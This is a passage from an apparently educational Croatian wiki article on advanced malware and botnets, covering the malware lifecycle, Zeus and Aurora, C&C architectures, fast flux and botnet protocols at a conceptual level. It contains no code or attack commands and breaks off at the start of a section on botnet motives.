</p><p>Stručnjaci iz FyreEye-a (kompanije koja se bavi proizvodnjom rješenja za obranu protiv naprednih malwarea, zero-day i ciljanih APT napada) navode kako je napredni malware dio naprednih, upornih cyber prijetnji koje djeluju koordinirano radi prodora organizacijske obrane i uspostavljanja dugoročnog uporišta u mreži s ciljem izviđanja, eksploatacije mrežne imovine, izvlačenja podataka, izmjene podataka, uništenja podataka i stalnog nadzora (prema <a href="http://www.digitaleragroup.com/component/rokdownloads/downloads/fireeye/254-principles-of-malware-protection-/download.html" class="external text" rel="nofollow">Digital Era Solutions</a>). Iz same definicije možemo vidjeti da se radi o veoma opasnoj prijetnji za sigurnost i da se tome treba pridati velika pozornost.
</p><p>Mogli bismo reći da početak infekcije naprednim malwareom čini početno iskorištavanje ili pak napad prethodno spomenutim socijalnim inženjeringom. Nakon što dođe do toga, pruža se temelj za niz nastavaka infekcije malwareom koje traju bez obzira na mnogostruke pokušaje skeniranja i onemogućavanja napada. Kako je malware postao sofisticiraniji, zbog čega je i dobio naziv napredni malware, tradicionalni klijentski antivirusni skenovi i mrežni skenovi upada nisu više u mogućnosti zaustaviti koordinirane skupove infekcija i napada. Naime, iako se neke infekcije detektiraju i uklone uz pomoć skenova što navodi klijenta na zaključak da je računalo sigurno, napadači mogu održati kontrolu nad sustavom. Tako primjerice, zero-day (računalna prijetnja koja iskorištava ranjivosti računalnih aplikacija koje nisu poznate drugima, kao ni developerima aplikacije), odnosno komponente malwarea koje nisu uklonjene, dopuštaju da se malware ponovno instalira te tako poremeti krajnju sigurnost sprječavajući svoje daljnje uklanjanje.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ucinkovitost_nm.png" class="image"><img alt="Ucinkovitost nm.png" src="../../images/3/3f/Ucinkovitost_nm.png" width="293" height="256" /></a>
</p><p>Na prethodno prikazanoj slici prikazana je učinkovitost obrane od tradicionalnih i naprednih malwarea, pa možemo vidjeti da je obrana od naprednih malwarea neučinkovita, za razliku od tradicionalnih od kojih se možemo uspješno obraniti jer su poznati njihovi napadi i akcije.
</p><p>Da bismo se što učinkovitije obranili od naprednih malwarea, prvi korak je utvrditi karakteristike prema kojima se mogu profilirati malwarei. Tako su neke od odabranih karakteristika nivo tajnosti, ciljana ranjivost, namjeravane žrtve te svrha ili cilj malwarea. (prema <a href="http://resources.idgenterprise.com/original/AST-0038416_FireEye_AdvMalwareExposed.pdf" class="external text" rel="nofollow">FireEye</a>, 2011., str. 5)
</p><p>Nivo tajnosti nekog malwarea može biti visok ili nizak, a postavlja se i pitanje da li se malware skriva ili sam sebe pokriva korištenjem tehnika kao što je polimorfizam ili skrivanje određenih poteza. Što se tiče ciljne ranjivosti, misli se na to da malware može ciljati poznate nezakrpane ranjivosti kao i nepoznate ranjivosti poznate kao „zero-day“ napadi. Namjeravane žrtve odnose se na ciljnu skupinu koju napada malware, pa tako malware može napasti na način da ne izdvaja posebno neku skupinu ili pak ciljajući određene žrtve koristeći e-mailove ili ugrožene web stranice. Svrha ili cilj malwarea može biti samo ometanje, a može sezati sve do namjere organiziranog kriminala ili cyber kriminala. Zadnja karakteristika je upornost i ona govori koji stupanj upornosti ima napredni malware. Na temelju tih karakteristika, načinjen je i grafički prikaz koji pokazuje razliku između naprednog i tradicionalnog malwarea na primjeru operacije Aurora (napadi nazavani Aurora, bili su namijenjeni za preuzimanje vrijednih datoteka od ugroženih strojeva).
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Razlika_nm_i_tm.png" class="image"><img alt="Razlika nm i tm.png" src="../../images/5/5d/Razlika_nm_i_tm.png" width="326" height="346" /></a>
</p><p>Na prikazanom primjeru razlike karakteristika između naprednog i tradicionalnog malwarea, možemo vidjeti da napredni malware ima viši nivo tajnosti, napada nepoznate ranjivosti, definirane ciljne skupine te je uporan iz čega se vidi da zadovoljava sve kriterije naprednog malwarea. Međutim, od Aurore postoje još sofisticiraniji malwarei kao što je Zeus o kojemu će biti više riječ kasnije u radu.
</p><p>Postojeći problem je to što napredni malwarei operiraju na najvišim razinama navedenih karakteristika, a tradicionalni na najnižim te tako i postojeća obrana operira na najnižim razinama. Tako primjerice, mehanizmi bazirani na potpisima reagiraju na poznate napade i gube u borbi protiv nepoznatih i tajnih napada. Osim toga, reputacija, heuristika i druge korelacijske tehnike ne mogu se nositi s ciljanim napadima jer zbog prirode tih napada ne postoje podaci za korelaciju (prema <a href="http://resources.idgenterprise.com/original/AST-0038416_FireEye_AdvMalwareExposed.pdf" class="external text" rel="nofollow">FireEye</a>, 2011., str. 7-8). Iz tog razloga, napadi naprednim malwareima uspješno nastavljaju upade i druge akcije u komercijalne, obrazovne i druge mreže i možemo zaključiti kako postojeće obrane od naprednih i inovativnih malwarea više nisu dovoljne, te da moramo pronaći odgovarajuće obrambene mehanizme koji će adresirati karakteristike tradicionalnih i naprednih malwarea.
</p>
<h3> <span class="mw-headline" id=".C5.BDivotni_ciklus_naprednog_malwarea">Životni ciklus naprednog malwarea</span></h3>
<p>Najbolji prikaz načina ulaska u sustav i djelovanja naprednog malwarea, prikazuje nam životni ciklus naprednog malwarea koji je prikazan na slijedećoj slici, a predstavlja jedan od usvojenih pristupa infekcije. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Zivotni_ciklus.gif" class="image"><img alt="Zivotni ciklus.gif" src="../../images/5/58/Zivotni_ciklus.gif" width="550" height="349" /></a>
</p><p>Prema prikazanoj slici životni ciklus malwarea sastoji se od 10 koraka: (prema <a href="http://www.damballa.com/cyber-threats/advanced_malware.php" class="external text" rel="nofollow">Damballa</a>) 
</p>
<ol><li>Žrtva surfa na web stranici ili klikne na e-mail sa malicioznim linkom.
</li><li>Preglednik se preusmjerava na malicioznu dropper stranicu.
</li><li>Žrtva je navedena na skidanje dropper-a ili je pak dropper automatski skinut kroz exploit.
</li><li>Dropper se raspakirava na računalo žrtve i izvršava se.
</li><li>Dropper kontaktira novu stranicu: UPDATE.
</li><li>UPDATE šalje C&amp;C (Command and Control) instrukcije.
</li><li>Dropper kontaktira C&amp;C stranicu (Site #1)  sa žrtvinim podacima o identitetu.
</li><li>C&amp;C Site #1 šalje šifrirani malware sa novim C&amp;C instrukcijama. Može čak biti i zaključan na žrtvin stroj.
</li><li>Malware je dešifriran od strane Dropper-a i instaliran. Dropper može ostati kao lažan dokaz za istražitelje, ili se izbrisati kako bi istražitelj vjerovao da nije došlo do infekcije odnosno da nikad nije ni bio na računalu.
</li><li>Malware kontaktira C&amp;C Site #2. Šalje lozinke, podatke, itd. kao šifrirani korisni teret (engl. payload).
</li></ol>
<p>Koraci 8, 9 i 10 se mogu ponoviti u neodređeno vrijeme, uz „dokaz“ zlonamjernih programa, tj. malwarea i uz konstantno mijenjajuće C&amp;C konekcijske instrukcije. Malwareu može biti promijenjena svrha ili mu može biti rečeno da bude u tišini u duljem vremenskom periodu. 
</p><p>Dakle, iz ovog prikazanog životnog ciklusa malwarea možemo vidjeti kako djeluje neki napredni malware, tj. njihovu upornost i neprimjetnost, te nam to ujedno može dodatno pobuditi svijest oko opasnosti koja nas okružuje i navesti nas na poduzimanje što boljih akcija oko osiguranja bilo vlastitog sustava, organizacijskog ili državnog sustava.
</p>
<h3> <span class="mw-headline" id="Svrha_naprednog_malwarea">Svrha naprednog malwarea</span></h3>
<p>Malware može biti namijenjen za razne svrhe kao što su cyber kriminal, cyber špijunaža te cyber ratovanje.
</p><p><i>Cyber kriminal</i>
</p><p>Pod cyber kriminalom podrazumijeva se da je glavni cilj odnosno svrha malwarea krađa imovine, važnih informacija (financijskih, poslovnih, osobnih itd.) i sl. koje se mogu dobro unovčiti. Tu nam se javlja i pojam botneta koji ćemo u nastavku i obrađivati, jer napadači znaju zarađivati na način da zaraze i povežu ogroman broj računala što ustvari predstavlja botnet.
</p><p>Primjer je Zeus Trojan iliti tzv. Zbot koji krade internetske bankovne vjerodajnice tako da preuzima online bankovne sesije i prepisuje Web stranice na žrtvina računalo kako bi izgledale kao bankovna stranica. To prevari korisnike prilikom tipkanja njihovih bankovnih vjerodajnica koje potom Zeus pošalje na server napadača, a radi agregiranja i prodaje najboljem ponuđaču. (prema <a href="http://www.digitaleragroup.com/component/rokdownloads/downloads/fireeye/254-principles-of-malware-protection-/download.html" class="external text" rel="nofollow">Digital Era Solutions</a>) 
</p><p><i>Cyber špijunaža</i>
</p><p>Kod cyber špijunaže svrha odnosno glavni cilj uporabe naprednih malwarea je na tajan način dobiti podatke i informacije koji se smatraju tajnima ili povjerljivima. Naime, što je više informacija u današnje vrijeme informatizirano, to se i povećava broj korištenja cyber špijunaže. Jedan od primjera naprednog malwarea za cyber špijunažu je Operation Aurora kojom se radila korporativna špijunaža.
</p><p><i>Cyber ratovanje</i> 
</p><p>Kada govorimo o cyber ratovanju misli se na nešto što još nije došlo, ali postoji vjerojatnost da do toga može doći. Naime, cyber ratovanje će vjerojatno uključivati napredni malware u aktivnostima izviđanja, prikupljanju informacija, ometanju komunikacije te napadima na infrastrukturu neke zemlje. Razlog što još do toga nije došlo vjerojatno nije zbog nedostataka u tehnologiji već zato što još nitko nije „povukao okidač“ (prema <a href="http://resources.idgenterprise.com/original/AST-0038416_FireEye_AdvMalwareExposed.pdf" class="external text" rel="nofollow">FireEye</a>, 2011., str. 19). Pitanje je vremena kada će doći do takvih napada te stoga zemlje moraju imati to umu i poduzeti određene akcije prije nego li dođe do katastrofalnih posljedica.  
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Anita.laktasic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Anita.laktasic (stranica ne postoji)">Anita Laktašić</a> 13:46, 28. prosinca 2011. (CET)
</p>
<h2> <span class="mw-headline" id="Botneti">Botneti</span></h2>
<p>Botneti su u današnje vrijeme postali veliki izazov i opasnost za informacijske sustave jer omogućuju izvršavanje mnogih kriminalnih radnji pogubnih za pojedince, organizacije ili pak vladu. Neki primjeri koristi od botneta su tako krađa identiteta i brojeva kartica, špijunaža, uskraćivanje usluga i druge kriminalne radnje koje imaju veliki značaj u današnjem modernom društvu. Prije nego krenemo dublje u temu o botnetima, pronašli smo jedan zanimljiv <a href="http://www.youtube.com/watch?v=WrYGUYBbSEk&amp;feature=player_embedded#!" class="external text" rel="nofollow">video</a> o botnetima, kojime odmah na početku želimo upozoriti na opasnost botneta i potrebnu svjesnost o zaštiti sustava. U nastavku biti će rečeno nešto više o botnetima kao veoma utjecajnoj mreži putem koje se mogu izvršiti spomenute radnje.
</p>
<h3> <span class="mw-headline" id="Definicija_botneta">Definicija botneta</span></h3>
<p>Botnete smo već spomenuli u dijelu o malwareima, a u ovom dijelu ćemo dati detaljniju definiciju botneta te ukratko opisati sam botnet.
</p><p>Botnet možemo definirati kao mrežu kompromitiranih računala kojima može biti upravljano s udaljenosti od strane napadača. Ta kompromitiranih računala znaju se zvati još i zombijima, a inficirana su uz pomoć botova koji predstavljaju napredni maliciozni softver odnosno bilo koji tip malwarea koji omogućava napadaču potajno preuzimanje kontrole nad inficiranim računalom. Osim toga, u nekim izvorima možemo naići na to da se pojam bot koristi kao opis hosta sa malicioznim softverom. U nastavku rada koristiti ćemo oba značenja pojma bot što će se lako prepoznati ovisno o kontekstu u kojem se spominje.
</p><p>Dakle, sam temelj botneta su botovi koji se povezuju nazad na centralni server ili druga inficirana računala, nakon što su uspješno inficirali hosta, tako formirajući mrežu koja čini botnet. Botovi, osim toga, pružaju širok spektar funkcionalnosti odgovarajućem kontrolnom entitetu, tj. C&amp;C (Command and Control) serveru koji je pod kontrolom jedne ili više osoba koje imaju engleski naziv botmasteri ili botheaderi, a koje šalju naredbe kroz server.
</p><p>Uz pomoć različitih komunikacijskih metoda kao što je IRC, napadači mogu probuditi ogroman broj zombija odnosno kompromitiranih računala te ih usmjeriti na izvršenje različitih kriminalnih akcija o kojima će biti riječ kasnije.
</p>
<h3> <span class="mw-headline" id="Stvaranje_i_.C5.A1irenje_botneta">Stvaranje i širenje botneta</span></h3>
<p>Faza stvaranje botneta veoma ovisi o vještinama i zahtjevima napadača koji želi stvoriti botnet mrežu. Napadač tako može ili sam napraviti kod, ili proširiti i prilagoditi postojeći bot. Naime, spremni botovi sa svim instrukcijama korištenja i kompromitiranja sustava prodaju se i na Internetu. Nakon što napadač odabere odgovarajući pristup, može započeti sa svojim napadom. 
</p><p>Za širenje botneta, napadač iskorištava ranjivosti sustava i alata hostova kako bi dobio pristup sustavima i instalirao bot uploadanjem ili naređivanjem žrtvinom hostu da skine kopiju bota. Ta faza uključuje razne načine odnosno tehnike širenja botova koje uključuju napad kroz ranjivosti softvera, socijani inženjering i slične ranjivosti spomenute u dijelu koji se odnosi na ranjivosti (Način rada malwarea i ranjivosti koje koristi). Osim toga, bot, tj. maliciozni softver se zna i širiti kroz peer to peer mreže, file sharing te direktnu „client to client“ razmjenu, pri čemu koristi protokole kao što su FTP, TFTP, HTTP i druge kako bi inficirao računala i dalje se širio, a moguć slučaj širenja botneta je i širenje na način da postojeći bonet stvara drugi botnet.
</p>
<h4> <span class="mw-headline" id="Primjer_kreiranja_botneta_i_njegova_.C5.A1irenja">Primjer kreiranja botneta i njegova širenja</span></h4>
<p>Da bi se računalo uopće inficiralo botom te na temelju toga postalo dio botneta, potrebno je  učitati bot na računalo. Prvi način učitavanja bota na računalo zahtijeva interakciju s korisnikom (npr. virus), dok drugi način ne zahtijeva nikakvu interakciju s korisnikom (npr. crv). U nastavku ćemo prikazati jednostavan primjer kreiranja botneta i njegova širenja. (ilustracije izrađene prema <a href="http://www.korelogic.com/Resources/Presentations/botnets_issa.pdf" class="external text" rel="nofollow">KoreLogic Security</a>, str. 6-9)
</p><p>U prvom koraku botmaster inficira računalo korisnika sa botom (npr. virus, crv).
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Inficiranje.png" class="image"><img alt="Inficiranje.png" src="../../images/e/eb/Inficiranje.png" width="402" height="246" /></a>
</p><p>U drugom koraku bot na inficiranom računalu se povezuje na C&amp;C (Command and Control ) server te čekaju naredbe botmastera. To može bit učinjeno koristeći IRC, HTTP i neke druge protokole.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Spajanje.png" class="image"><img alt="Spajanje.png" src="../../images/f/f9/Spajanje.png" width="402" height="246" /></a>
</p><p>U trećem koraku, nakon uspješnog uspostavljanja botnet mreže, botmaster šalje naredbe kroz C&amp;C server inficiranom računalu čime se izvršavaju namjere botmastera.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Slanje_naredbi.png" class="image"><img alt="Slanje naredbi.png" src="../../images/7/74/Slanje_naredbi.png" width="402" height="246" /></a>
</p><p>Sve se ponavlja te tako uskoro botmaster stvori vojsku botova koje može kontrolirati iz jedne točke.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Sirenje.png" class="image"><img alt="Sirenje.png" src="../../images/c/cc/Sirenje.png" width="402" height="246" /></a>
</p><p>Osim prikazanog scenarija kreiranja i širenja botneta, moguć je i scenarij u kojemu su prva dva koraka ista, no treći je drugačiji jer u trećem koraku botmaster može iznajmiti odnosno prodati svoje usluge trećoj strani za obavljanje kriminalnih radnji, te onda u četvrtom koraku naručitelj, odnosno treća strana dostavlja botmasteru sadržaj koji želi proširiti (npr. spam mail), nakon čega botmaster šalje naredbe inficiranim računalima preko C&amp;C servera s namjerom da oni šalju taj sadržaj.
</p>
<h3> <span class="mw-headline" id="Command_and_Control_infrastruktura">Command and Control infrastruktura</span></h3>
<p>Nakon što je neko računalo zaraženo malwareom, botmaster ima za zadatak otkriti strojeve odnosno računala zaražena botovima odnosno malwareima. Kada ih otkrije, botmaster mora kontrolirati zaražene strojeve putem neke vrste komunikacije tako da im šalje naredbe koje želi da izvrše. To nas vodi dovodi do samog pojma Command and Control (C&amp;C) infrastrukture koja se sastoji od botova, tj. inficiranih računala i kontrolnog entiteta pri čemu botmasteri koriste jedan ili više protokola za slanje naredbi inficiranim računalima kako bi mogli koordinirati njihovim radom. Preciznije rečeno, botovima se upravlja kroz takozvane Command and Control kanale koji se kreiraju na Command and Control serveru slanjem odgovarajućih naredbi radi organiziranja nekog napada. Odabir Command and Control strukture i protokola je jedna od najvažnijih odluka napadača koju treba odrediti prije izgradnje botneta. Taj odabir utječe na važne karakteristike botneta kao što su robusnost, latencija, stabilnost i vidljivost. Postoji više pristupa odnosno strukturi, dok općenito možemo razlikovati centralizirani i decentralizirani pristup koje ćemo u nastavku i opisati uz još jedan tzv. hibridni pristup.
</p>
<h4> <span class="mw-headline" id="Centralizirana_C.26C_struktura">Centralizirana C&amp;C struktura</span></h4>
<p>Centralizirana C&amp;C struktura botneta je građena na temelju klasične klijent-server sheme. U takvim botnetima, botovi djeluju kao klijenti i oni se povezuju nazad na jedan ili više centralnih servera, tj. Command and Control servera od kojih dobivaju naredbe pri čemu većinom koriste komunikacijske protokole kao što su IRC i HTTP za interakciju sa serverom. Ti serveri su pod kontrolom botmastera. Kako se svi botovi spajaju na Command and Control server/e, botmasteri mogu simultano komunicirati sa svim botovima te davati naredbe svim botovima koji su online i spojeni na botnet putem servera koji prosljeđuje naredbe klijentima, tj. botovima (prema <a href="http://www.enisa.europa.eu/act/res/botnets/botnets-measurement-detection-disinfection-and-defence" class="external text" rel="nofollow">ENISA</a>, 2011., str. 15). Ovakva struktura zbog direktnih veza pruža brzo vrijeme reakcije i dobru koordinaciju, jednostavan nadzor statusa botneta, te pruža informacije o broju  aktivnih botova i slično.
</p><p>Osim navedene strukture sa jednim serverom, moguća je i struktura koja ima više servera. Takva struktura ima najčešće hijerarhijski dizajn i može uključivati servere koji će grupirati botove u podgrupe.
</p><p>Bez obzira na prednosti koje centralizirana struktura ima, ona posjeduje i neke mane. Naime, kako je centralizirana struktura neovisna o protokolu, lakše je otkriti centraliziranu komunikaciju nego li decentraliziranu. Osim toga, potrebno je samo deaktivirati C&amp;C server da bi se u potpunosti poremetio odnosno onesposobio botnet jer botmaster onda više ne može slati naredbe botovima u mreži. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Centralized.png" class="image"><img alt="Centralized.png" src="../../images/b/bc/Centralized.png" width="625" height="339" /></a>
</p>
<h4> <span class="mw-headline" id="Peer_to_Peer_.28P2P.29_C.26C_struktura">Peer to Peer  (P2P) C&amp;C struktura</span></h4>
<p>U Peer to Peer C&amp;C strukturi botneta, svaki bot je peer i djeluje u isto vrijeme kao klijent i kao server što se označava engleskim pojmom servent, a to znači da ne postoji stvarni centralni server kao u prethodno opisanoj strukturi, te da se radi o decentraliziranoj strukturi. Naime, umjesto da se botovi spajaju na centralni server, bot se pridružuje mreži kontaktiranjem postojećeg peer-a u mreži, tj. botnetu, a da bi to učinio mora znati najmanje jednog peer-a u P2P mreži korištenoj kao botnet (prema <a href="http://www.internet-sicherheit.de/fileadmin/docs/publikationen/dietrich/Christian-Rossow-Christian-J.-Dietrich-Literature-survey-and-Report.pdf" class="external text" rel="nofollow">Institut für Internet-Sicherheit</a>, 2009., str. 10). Informacije o cijelom botnetu ne mogu biti direktno dobivene, a naredbe moraju biti ubačene u jedan od peer-ova botneta. To je obično realizirano direktno putem komunikacijskog protokola ili preko funkcionalnosti ažuriranja (prema <a href="http://www.enisa.europa.eu/act/res/botnets/botnets-measurement-detection-disinfection-and-defence" class="external text" rel="nofollow">ENISA</a>, 2011., str. 17).
</p><p>Za razliku od centralizirane C&amp;C strukture botneta, Peer to Peer C&amp;C strukturu botneta je mnogo teže otkriti i uništiti. To znači da ugrožavanje jednog ili više botova ne znači ujedno i gubljenje cijelog botneta. Međutim, veličina botneta podržana P2P strukturom je mala u odnosu na centraliziranu strukturu, radi čega ujedno profitno orijentirani napadači manje koriste tu strukturu, a osim toga, latencija i zajamčenost isporuke poruke nedostatak je P2P strukture, te je nadzor aktivnosti u botnetu veoma težak.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Decentralized.png" class="image"><img alt="Decentralized.png" src="../../images/4/47/Decentralized.png" width="445" height="339" /></a>
</p>
<h4> <span class="mw-headline" id="Hibridna_C.26C_struktura">Hibridna C&amp;C struktura</span></h4>
<p>Hibridna C&amp;C struktura je ustvari kombinacija centralizirane C&amp;C strukture i P2P C&amp;C strukture. Do te strukture je došlo iz razloga što su se željeli nadvladati nedostatci obe spomenute strukture.
</p><p>Na prikazanoj slici možemo vidjeti mogući botnet hibridne C&amp;C strukture. Tako na slici možemo vidjeti više P2P mreža, u kojima su botovi jedne podmreže povezani nasumično i tako čine jednu malu mrežu. Te mreže su preko svojih super peer-ova povezane na centralni C&amp;C server kako bi mogle primati naredbe za provedbu napadačevih namjera. Što se tiče botmastera, ovisno o strukturi mreže, može biti obični peer ili pak može davati naredbe direktno centralnom serveru. Međutim, osim opisane hibridne strukture, moguć je i obrnut pristup u kojemu su podmreže centralizirano strukturirane, a zatim povezane sa drugima u obliku P2P mreže.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Hybrid.png" class="image"><img alt="Hybrid.png" src="../../images/e/ed/Hybrid.png" width="624" height="450" /></a>
</p>
<h4> <span class="mw-headline" id="Usporedba_C.26C_struktura">Usporedba C&amp;C struktura</span></h4>
<p>Na temelju najvažnijih karakteristika svih navedenih C&amp;C struktura botneta napravljena je usporedba prikazana u tablici (prema <a href="http://www.internet-sicherheit.de/fileadmin/docs/publikationen/dietrich/Christian-Rossow-Christian-J.-Dietrich-Literature-survey-and-Report.pdf" class="external text" rel="nofollow">Institut für Internet-Sicherheit</a>, 2009., str. 11-12) u nastavku.
</p>
<table class="wikitable">
<tr>
<th>
</th>
<th> Centralizirana C&amp;C struktura
</th>
<th> Decentralizirana (P2P) C&amp;C struktura
</th>
<th> Hibridna C&amp;C struktura
</th></tr>
<tr>
<td> Detekcija
</td>
<td> Lagana
</td>
<td> Teška
</td>
<td> Srednja
</td></tr>
<tr>
<td> Elastičnost
</td>
<td> Mala
</td>
<td> Veoma visoka
</td>
<td> Prilično visoka
</td></tr>
<tr>
<td> Latencija
</td>
<td> Niska
</td>
<td> Prilično visoka
</td>
<td> Srednja
</td></tr>
<tr>
<td> Pronalazak
</td>
<td> Prilično težak
</td>
<td> Veoma težak
</td>
<td> Težak
</td></tr>
<tr>
<td> Složenost
</td>
<td> Jednostavna
</td>
<td> Srednja
</td>
<td> Visoka
</td></tr>
<tr>
<td> Iskustvo
</td>
<td> Veoma visoko
</td>
<td> Srednje
</td>
<td> Nikakvo
</td></tr></table>
<p>Detekcija se odnosi na botmastere, odnosno da njihovu detekciju od strane mrežnih operatora i drugih stručnjaka iz područja sigurnosti. Na temelju prikazane tablice, možemo vidjeti kako je najlakše detektirati botnete s centraliziranom strukturom, a najteže je detektirati botnete s decentraliziranom strukturom.
</p><p>Elastičnost se odnosi na otpornost botneta protiv uklanjanja botova ili ometanja komunikacije. Naime, radi se o tome da uklanjanjem servera iz centralizirane strukture se može narušiti cijela komunikacija u botnetu dok kod peer to peer strukture uklanjanje jednog peer-a ne utječe mnogo na djelotvornost botneta, što se može vidjeti i po ocjenama iz tablice, a i prethodno je spomenuto prilikom opisa C&amp;C strukturi botneta.
</p><p>Latencija se odnosi na to koliko dugo je potrebno da naredba od strane botmastera stigne do odgovarajućeg skupa botova u botnetu. Tako kao što je prethodno spomenuto, ali i prikazano u tablici, naredbe u centraliziranoj strukturi stižu brže nego li u P2P strukturi jer kod centralizirane strukture naredbe idu direktno svakom od botova.
</p><p>Pronalazak se odnosi na to koliko lagano je pronaći stvarnog napadača u botnetu. Naime, radi se o tome da botmasteri koriste put proxy-ja za slanje naredbi botovima čime skrivaju svoj identitet. Međutim, u centraliziranim mrežama lakše je pronaći napadača nego li u P2P mrežama jer u P2P mrežama nije jasno odakle su ustvari naredbe unesene. 
</p><p>Složenost se odnosi na to koliko teško i složeno je uspostavljanje određene C&amp;C strukture. Tako možemo vidjeti u tablici da je jednostavnije uspostaviti  centraliziranu C&amp;C strukturu nego li P2P C&amp;C strukturu što je i jasno jer u centraliziranoj strukturi su svi botovi direktno povezani na server dok u P2P strukturi su botovi nasumično povezani radi čega je ujedno i teža kontrola nad njima.
</p><p>Iskustvo se odnosi na to koliko često je struktura botneta do danas korištena. Kako se centralizirana struktura koristila veoma dugo vremena, iskustvo je veoma visoko, a P2P strukture se sve više koriste te je tako iskustvo još srednje, dok se hibridna struktura dosad još nije koristila u praksi od strane napadača te je tako i iskustvo nikakvo.
</p>
<h4> <span class="mw-headline" id="Uloga_DNS-a_za_botnete">Uloga DNS-a za botnete</span></h4>
<p>DNS ima veoma bitnu ulogu kod centraliziranog pristupa. Naime, DNS dopušta da se promjene C&amp;C arhitekture obavljaju dinamički. Kada se DNS koristi, C&amp;C server se identificira prema C&amp;C imenu domene koje se uz pomoć DNS-a prevodi u IP adresu. Tako su višestruke, uspješne tehnike smanjenja botneta usmjerene na DNS primjene i u praksi, a primjer je deregistracija imena malicioznih domena (prema <a href="http://www.enisa.europa.eu/act/res/botnets/botnets-measurement-detection-disinfection-and-defence" class="external text" rel="nofollow">ENISA</a>, 2011., str. 18).
</p><p>Kada se spominje DNS u vezi s botnetima, dobro je spomenuti i Fast Flux. To je tehnika koju koriste botneti da bi povećali elastičnost odnosno otpornost na uklanjanje botova ili ometanje botneta i da bi povećali anonimnost. Temeljna ideja Fast Flux-a je imanje velikog broja IP adresa povezanih sa jednim potpuno kvalificiranim imenom domene, gdje su IP adrese zamijenjene sa ekstremno viskom učestalosti kroz mijenjajuće DNS zapise.
</p>
<h3> <span class="mw-headline" id="Botnet_komunikacijski_protokoli">Botnet komunikacijski protokoli</span></h3>
<p>Command and Control strukture odnosno tehnike, kao što je spomenuto, mogu koristiti različite komunikacijske protokole. Komunikacijski protokoli koji se koriste u botnetima pružaju razumijevanje podrijetla botneta i mogućih programskih alata koje botnet može koristiti. Osim toga, znanje o tome koje komunikacijske protokole koristi botnet omogućava razumijevanje za dešifriranje komunikacije koja zauzima mjesto između bota i botmastera (prema <a href="http://sprouts.aisnet.org/594/1/Botnet_Sprotus.pdf" class="external text" rel="nofollow">Sprouts</a>, 2009., str. 8).
</p><p>Neki od komunikacijskih protokola koje koriste Command and Control tehnike su protokoli kao što su IRC, HTTP, IM. U nastavku ćemo ukratko proći kroz sve navedene protokole.
</p><p><i>IRC</i>
</p><p>Kada je riječ o botnetima, najrašireniji mrežni protokol koji se koristi je Internet Relay Chat (IRC). Taj protokol je visoko skalabilan i ima ekstremno niske latencije zbog jednostavnosti i malog oveheada IRC formata. U IRC baziranom botnetu, C&amp;C server je instaliran kao IRC server na host računalu te botmaster kreira kanal na C&amp;C serveru, a botovi povezani na taj kanal primaju naredbe od botmastera i izvršavaju te naredbe kako bi vršili razne maliciozne funkcije. Važno svojstvo IRC protokola je i da broj potencijalnih učesnika u jednom kanalu, tehnički nije ograničen što omogućava veliku kolekciju botova u jednom kanalu. IRC je ujedno savršen protokol za rukovanje s botovima jer podržava lozinke i privatne chatove. Mana IRC-a je to da kad je kanal jednom detektiran, može biti veoma jednostavno skinut od strane nadležnih. Osim toga, praćenje IRC prometa i instalacija Firewall-a odnosno nedopuštanje prometa na određenom portu može smanjiti šanse da host postane žrtva botmstera, tj. da postane još jedan od botova u botnetu ili pak može onemogućiti komunikaciju sa botmasterom.
</p><p><i>HTTP</i>
</p><p>HTTP je još jedan od protokola koji botnet može koristiti, a smatra se jednim od najraširenijih protokola na Internetu. Profesionalci često HTTP znaju zvati Universal Firewall Traversal jer promet na portu 80 je gotovo uvijek dopušten što omogućava lakšu zarazu (prema <a href="http://www.malwarecity.com/blog/anatomy-of-a-botnet-196.html" class="external text" rel="nofollow">MALWARE CITY</a>). U usporedbi s IRC protokolom, možemo reći da je HTTP manje prikladan od IRC-a za velike botnete, ali s druge strane osigurava botmastere da mogu kontaktirati svoje botove. HTTP botneti su jednostavniji za postavljanje i izvršavanje, ali ih je teže detektirati unatoč tome što je HTTP promet generiran od botneta drugačiji od normalnog HTTP prometa jer se skriva unutar jako velikog legitimnog HTTP prometa, te tako HTTP botneti sve više postaju preferirani pristup za Command and Control sustave zombi mreža odnosno botneta. 
</p><p><i>IM</i>
</p><p>Instant Messaging (IM) botneti, odnosno botneti koji se baziraju na IM protokolu, rjeđi su od IRC ili HTTP botneta iako se oslanjaju na istu tehnologiju. Razlika IM botneta od IRC mreža je u tome što oni koriste komunikacijske kanale pružene od IM servisa kao što su AOL, MSN, ICQ,Yahoo i slični (prema <a href="http://www.malwarecity.com/blog/anatomy-of-a-botnet-196.html" class="external text" rel="nofollow">MALWARE CITY</a>). Razlog manjeg korištenja IM botneta je u tome što je veoma teško stvoriti individualne IM račune za svaki bot u mreži botova.
</p><p>Osim navedenih protokola na kojima se mogu temeljiti botneti, postoje i drugi protokoli koje botneti mogu koristiti no pošto su oni rjeđi ovim putem ih nismo spomenuli.
</p>
<h3> <span class="mw-headline" id="Motivacija_i_koristi_od_botneta">Motivacija i koristi od botneta</span></h3>
<p>Botnet je ništa više nego alat kojega koriste napadači sa različitim motivima. Najčešći motivi napadača su upravo kriminalni ili destruktivni motivi. Naime, botnet pruža ogromne mogućnosti sa svojim skupom umreženih računala, a koje mogućnosti će napadač iskoristiti ovisi o mašti i vještini napadača. U današnje vrijeme glavni motiv napadača je generirati profit od akcija koje omogućava botnet. Neke od mogućnosti odnosno akcija koje omogućuju botneti biti će ukratko spomenute u nastavku.
</p><p><i>Krađa identiteta i privatnih korisničkih podataka</i>
